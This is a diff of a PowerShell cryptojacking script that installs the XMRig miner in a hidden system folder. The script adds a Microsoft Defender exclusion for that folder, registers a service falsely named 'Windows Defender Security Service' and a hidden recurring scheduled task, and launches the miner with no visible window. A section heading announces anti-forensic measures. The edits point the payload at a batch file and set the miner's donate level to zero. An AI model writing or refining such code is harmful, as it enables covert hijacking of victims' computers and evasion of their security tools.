@@ -120,7 +120,7 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # Define hidden payload path
 $hiddenDir = "C:\ProgramData\Microsoft\Windows NT"
 #$payloadName = "svchost.exe"
-$destinationPath = "$hiddenDir\xmrig-6.22.2\xmrig.exe"  #Join-Path $hiddenDir $payloadName
+$destinationPath = "$hiddenDir\xmrig-6.22.2\w.bat"  #Join-Path $hiddenDir $payloadName
 #$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
 
 # mkdir "$hiddenDir\xmrig-6.22.2"
@@ -154,7 +154,7 @@ Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction SilentlyContinue
 $serviceName = "WinDefendSvc_$((Get-Date).Ticks)"
 try {
     New-Service -Name $serviceName `
-        -BinaryPathName "`"$destinationPath`" --donate-level=1" `
+        -BinaryPathName "`"$destinationPath`" --donate-level=0" `
         -DisplayName "Windows Defender Security Service" `
         -StartupType Automatic `
         -Description "Provides system security services" | Out-Null
@@ -171,7 +171,7 @@ catch {
 $taskName = "WinDefendTask_$((Get-Date).Ticks)"
 try {
     # Added -WindowStyle Hidden to prevent console window popup
-    $action = New-ScheduledTaskAction -Execute $destinationPath -Argument "--donate-level=1" -WindowStyle Hidden
+    $action = New-ScheduledTaskAction -Execute $destinationPath -Argument "--donate-level=0" -WindowStyle Hidden
     $trigger1 = New-ScheduledTaskTrigger -AtStartup
     $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 60)
     
@@ -225,7 +225,7 @@ catch {
 
 # 4. Immediate Execution (Hidden)
 if (-not (Get-Process -Name (Get-Item $destinationPath).BaseName -ErrorAction SilentlyContinue)) {
-    Start-Process $destinationPath -ArgumentList "--donate-level=1" -WindowStyle Hidden
+    Start-Process $destinationPath -ArgumentList "--donate-level=0" -WindowStyle Hidden
 }
 
 # 5. Anti-Forensic Measures
